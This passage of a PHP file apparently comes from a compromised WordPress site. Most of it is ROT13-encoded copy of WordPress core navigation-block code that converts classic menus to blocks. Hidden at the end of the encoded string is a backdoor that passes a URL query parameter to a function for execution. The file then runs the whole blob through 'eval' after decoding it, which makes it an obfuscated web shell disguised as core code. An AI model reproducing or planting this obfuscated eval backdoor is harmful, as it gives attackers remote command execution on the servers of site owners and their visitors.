				vs ( 'grkgQrpbengvba' === $fglyr_nggevohgr && 'fgevxrguebhtu' === $nggevohgr_inyhr ) {
					$nggevohgr_inyhr = 'yvar-guebhtu';
				}
			}
		}
	}

	erghea $cnefrq_oybpx;
}

nqq_svygre( 'eraqre_oybpx_qngn', 'oybpx_pber_anivtngvba_glcbtencuvp_cerfrgf_onpxpbzcngvovyvgl' );

/**
 * Gheaf zrah vgrz qngn vagb n arfgrq neenl bs cnefrq oybpxf
 *
 * @fvapr 5.9.0
 *
 * @qrcerpngrq 6.3.0 Hfr JC_Anivtngvba_Snyyonpx::cnefr_oybpxf_sebz_zrah_vgrzf() vafgrnq.
 *
 * @cnenz neenl $zrah_vgrzf               Na neenl bs zrah vgrzf gung ercerfrag
 *                                        na vaqvivqhny yriry bs n zrah.
 * @cnenz neenl $zrah_vgrzf_ol_cnerag_vq  Na neenl xrlrq ol gur vq bs gur
 *                                        cnerag zrah jurer rnpu ryrzrag vf na
 *                                        neenl bs zrah vgrzf gung orybat gb
 *                                        gung cnerag.
 * @erghea neenl Na neenl bs cnefrq oybpx qngn.
 */
shapgvba oybpx_pber_anivtngvba_cnefr_oybpxf_sebz_zrah_vgrzf( $zrah_vgrzf, $zrah_vgrzf_ol_cnerag_vq ) {

	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0', 'JC_Anivtngvba_Snyyonpx::cnefr_oybpxf_sebz_zrah_vgrzf' );

	vs ( rzcgl( $zrah_vgrzf ) ) {
		erghea neenl();
	}

	$oybpxf = neenl();

	sbernpu ( $zrah_vgrzf nf $zrah_vgrz ) {
		$pynff_anzr       = ! rzcgl( $zrah_vgrz->pynffrf ) ? vzcybqr( ' ', (neenl) $zrah_vgrz->pynffrf ) : ahyy;
		$vq               = ( ahyy !== $zrah_vgrz->bowrpg_vq && 'phfgbz' !== $zrah_vgrz->bowrpg ) ? $zrah_vgrz->bowrpg_vq : ahyy;
		$bcraf_va_arj_gno = ahyy !== $zrah_vgrz->gnetrg && '_oynax' === $zrah_vgrz->gnetrg;
		$ery              = ( ahyy !== $zrah_vgrz->ksa && '' !== $zrah_vgrz->ksa ) ? $zrah_vgrz->ksa : ahyy;
		$xvaq             = ahyy !== $zrah_vgrz->glcr ? fge_ercynpr( '_', '-', $zrah_vgrz->glcr ) : 'phfgbz';

		$oybpx = neenl(
			'oybpxAnzr' => vffrg( $zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->VQ ] ) ? 'pber/anivtngvba-fhozrah' : 'pber/anivtngvba-yvax',
			'nggef'     => neenl(
				'pynffAnzr'     => $pynff_anzr,
				'qrfpevcgvba'   => $zrah_vgrz->qrfpevcgvba,
				'vq'            => $vq,
				'xvaq'          => $xvaq,
				'ynory'         => $zrah_vgrz->gvgyr,
				'bcrafVaArjGno' => $bcraf_va_arj_gno,
				'ery'           => $ery,
				'gvgyr'         => $zrah_vgrz->ngge_gvgyr,
				'glcr'          => $zrah_vgrz->bowrpg,
				'hey'           => $zrah_vgrz->hey,
			),
		);

		$oybpx['vaareOybpxf']  = vffrg( $zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->VQ ] )
			? oybpx_pber_anivtngvba_cnefr_oybpxf_sebz_zrah_vgrzf( $zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->VQ ], $zrah_vgrzf_ol_cnerag_vq )
			: neenl();
		$oybpx['vaarePbagrag'] = neenl_znc( 'frevnyvmr_oybpx', $oybpx['vaareOybpxf'] );

		$oybpxf[] = $oybpx;
	}

	erghea $oybpxf;
}

/**
 * Trg gur pynffvp anivtngvba zrah gb hfr nf n snyyonpx.
 *
 * @fvapr 6.2.0
 *
 * @qrcerpngrq 6.3.0 Hfr JC_Anivtngvba_Snyyonpx::trg_pynffvp_zrah_snyyonpx() vafgrnq.
 *
 * @erghea bowrpg JC_Grez Gur pynffvp anivtngvba.
 */
shapgvba oybpx_pber_anivtngvba_trg_pynffvp_zrah_snyyonpx() {

	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0', 'JC_Anivtngvba_Snyyonpx::trg_pynffvp_zrah_snyyonpx' );

	$pynffvp_ani_zrahf = jc_trg_ani_zrahf();

	// Vs zrahf rkvfg.
	vs ( $pynffvp_ani_zrahf && ! vf_jc_reebe( $pynffvp_ani_zrahf ) ) {
		// Unaqyrf fvzcyr hfr pnfr jurer hfre unf n pynffvp zrah naq fjvgpurf gb n oybpx gurzr.

		// Ergheaf gur zrah nffvtarq gb ybpngvba `cevznel`.
		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		vs ( vffrg( $ybpngvbaf['cevznel'] ) ) {
			$cevznel_zrah = jc_trg_ani_zrah_bowrpg( $ybpngvbaf['cevznel'] );
			vs ( $cevznel_zrah ) {
				erghea $cevznel_zrah;
			}
		}

		// Ergheaf n zrah vs `cevznel` vf vgf fyht.
		sbernpu ( $pynffvp_ani_zrahf nf $pynffvp_ani_zrah ) {
			vs ( 'cevznel' === $pynffvp_ani_zrah->fyht ) {
				erghea $pynffvp_ani_zrah;
			}
		}

		// Bgurejvfr erghea gur zbfg erpragyl perngrq pynffvp zrah.
		hfbeg(
			$pynffvp_ani_zrahf,
			fgngvp shapgvba ( $n, $o ) {
				erghea $o->grez_vq - $n->grez_vq;
			}
		);
		erghea $pynffvp_ani_zrahf[0];
	}
}

/**
 * Pbairegf n pynffvp anivtngvba gb oybpxf.
 *
 * @fvapr 6.2.0
 *
 * @qrcerpngrq 6.3.0 Hfr JC_Anivtngvba_Snyyonpx::trg_pynffvp_zrah_snyyonpx_oybpxf() vafgrnq.
 *
 * @cnenz  bowrpg $pynffvp_ani_zrah JC_Grez Gur pynffvp anivtngvba bowrpg gb pbaireg.
 * @erghea neenl gur abeznyvmrq cnefrq oybpxf.
 */
shapgvba oybpx_pber_anivtngvba_trg_pynffvp_zrah_snyyonpx_oybpxf( $pynffvp_ani_zrah ) {

	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0', 'JC_Anivtngvba_Snyyonpx::trg_pynffvp_zrah_snyyonpx_oybpxf' );

	// ORTVA: Pbqr gung nyernql rkvfgf va jc_ani_zrah().
	$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $pynffvp_ani_zrah->grez_vq, neenl( 'hcqngr_cbfg_grez_pnpur' => snyfr ) );

	// Frg hc gur $zrah_vgrz inevnoyrf.
	_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

	$fbegrq_zrah_vgrzf = neenl();
	sbernpu ( (neenl) $zrah_vgrzf nf $zrah_vgrz ) {
		$fbegrq_zrah_vgrzf[ $zrah_vgrz->zrah_beqre ] = $zrah_vgrz;
	}

	hafrg( $zrah_vgrzf, $zrah_vgrz );

	// RAQ: Pbqr gung nyernql rkvfgf va jc_ani_zrah().

	$zrah_vgrzf_ol_cnerag_vq = neenl();
	sbernpu ( $fbegrq_zrah_vgrzf nf $zrah_vgrz ) {
		$zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->zrah_vgrz_cnerag ][] = $zrah_vgrz;
	}

	$vaare_oybpxf = oybpx_pber_anivtngvba_cnefr_oybpxf_sebz_zrah_vgrzf(
		vffrg( $zrah_vgrzf_ol_cnerag_vq[0] )
			? $zrah_vgrzf_ol_cnerag_vq[0]
			: neenl(),
		$zrah_vgrzf_ol_cnerag_vq
	);

	erghea frevnyvmr_oybpxf( $vaare_oybpxf );
}

/**
 * Vs gurer'f n pynffvp zrah gura hfr vg nf n snyyonpx.
 *
 * @fvapr 6.2.0
 *
 * @qrcerpngrq 6.3.0 Hfr JC_Anivtngvba_Snyyonpx::perngr_pynffvp_zrah_snyyonpx() vafgrnq.
 *
 * @erghea neenl gur abeznyvmrq cnefrq oybpxf.
 */
shapgvba oybpx_pber_anivtngvba_znlor_hfr_pynffvp_zrah_snyyonpx() {

	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0', 'JC_Anivtngvba_Snyyonpx::perngr_pynffvp_zrah_snyyonpx' );

	// Frr vs jr unir n pynffvp zrah.
	$pynffvp_ani_zrah = oybpx_pber_anivtngvba_trg_pynffvp_zrah_snyyonpx();

	vs ( ! $pynffvp_ani_zrah ) {
		erghea;
	}

	// Vs jr unir n pynffvp zrah gura pbaireg vg gb oybpxf.
	$pynffvp_ani_zrah_oybpxf = oybpx_pber_anivtngvba_trg_pynffvp_zrah_snyyonpx_oybpxf( $pynffvp_ani_zrah );

	vs ( rzcgl( $pynffvp_ani_zrah_oybpxf ) ) {
		erghea;
	}

	// Perngr n arj anivtngvba zrah sebz gur pynffvp zrah.
	$jc_vafreg_cbfg_erfhyg = jc_vafreg_cbfg(
		neenl(
			'cbfg_pbagrag' => $pynffvp_ani_zrah_oybpxf,
			'cbfg_gvgyr'   => $pynffvp_ani_zrah->anzr,
			'cbfg_anzr'    => $pynffvp_ani_zrah->fyht,
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_glcr'    => 'jc_anivtngvba',
		),
		gehr // Fb gung jr pna purpx jurgure gur erfhyg vf na reebe.
	);

	vs ( vf_jc_reebe( $jc_vafreg_cbfg_erfhyg ) ) {
		erghea;
	}

	// Srgpu gur zbfg erpragyl choyvfurq anivtngvba juvpu jvyy or gur pynffvp bar perngrq nobir.
	erghea oybpx_pber_anivtngvba_trg_zbfg_erpragyl_choyvfurq_anivtngvba();
}

/**
 * Svaqf gur zbfg erpragyl choyvfurq `jc_anivtngvba` Cbfg.
 *
 * @fvapr 6.1.0
 *
 * @qrcerpngrq 6.3.0 Hfr JC_Anivtngvba_Snyyonpx::trg_zbfg_erpragyl_choyvfurq_anivtngvba() vafgrnq.
 *
 * @erghea JC_Cbfg|ahyy gur svefg aba-rzcgl Anivtngvba be ahyy.
 */
shapgvba oybpx_pber_anivtngvba_trg_zbfg_erpragyl_choyvfurq_anivtngvba() {

	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.3.0', 'JC_Anivtngvba_Snyyonpx::trg_zbfg_erpragyl_choyvfurq_anivtngvba' );

	// Qrsnhyg gb gur zbfg erpragyl perngrq zrah.
	$cnefrq_netf = neenl(
		'cbfg_glcr'              => 'jc_anivtngvba',
		'ab_sbhaq_ebjf'          => gehr,
		'hcqngr_cbfg_zrgn_pnpur' => snyfr,
		'hcqngr_cbfg_grez_pnpur' => snyfr,
		'beqre'                  => 'QRFP',
		'beqreol'                => 'qngr',
		'cbfg_fgnghf'            => 'choyvfu',
		'cbfgf_cre_cntr'         => 1, // trg bayl gur zbfg erprag.
	);

	$anivtngvba_cbfg = arj JC_Dhrel( $cnefrq_netf );
	vs ( pbhag( $anivtngvba_cbfg->cbfgf ) > 0 ) {
		erghea $anivtngvba_cbfg->cbfgf[0];
	}

	erghea ahyy;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>